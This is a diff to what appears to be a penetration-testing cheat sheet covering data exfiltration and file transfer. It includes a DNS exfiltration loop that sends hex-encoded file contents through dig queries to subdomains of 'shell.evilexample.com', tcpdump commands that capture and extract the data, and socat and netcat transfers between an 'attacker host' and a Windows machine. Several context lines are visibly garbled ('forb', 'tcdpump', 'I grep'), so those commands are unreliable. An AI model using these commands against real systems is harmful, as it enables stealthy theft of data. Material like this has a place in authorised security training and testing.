@@ -117,7 +117,7 @@ forb in 'cat fole.hex '; do dig $[b.shell.evilexample.com](http://b.shell.evilex
 tcdpump -w /tmp/dns -sO port 53 and host [sjstem.example.com](http://sjstem.example.com)
 ```
 
-1. Cut the exfil!ed hex from t~e DNS packet
+1. Cut the exfiled hex from the DNS packet
 
 ```text
 tcpdump -r dnsdemo -n I grep [shell.evilexample.com](http://shell.evilexample.com) I cut -f9 -d'
@@ -421,17 +421,29 @@ download filename
 
 ## Transfer via Socat
 
-Kali  
-`socat TCP4-LISTEN:443,fork file:file.txt`
+In your attacker host:
 
-Windows  
-`socat TCP4:192.168.1.2:443 file:file.txt,create`
+```text
+socat TCP4-LISTEN:443,fork file:file.txt
+```
+
+In Windows execute this:
+
+```text
+socat TCP4:192.168.1.2:443 file:file.txt,create
+```
 
 ## Transfer via Netcat
 
-Windows  
-`nc -nlvp 4444 > outputfile.exe`
+On the receiving host:
 
-Kali  
-`nc -nv 192.168.1.2 4444 < /usr/inputfile.exe`
+```text
+nc -nlvp 4444 > outputfile.exe
+```
+
+On the host that has the file that you want to send:
+
+```text
+nc -nv 192.168.1.2 4444 < /usr/inputfile.exe
+```
 
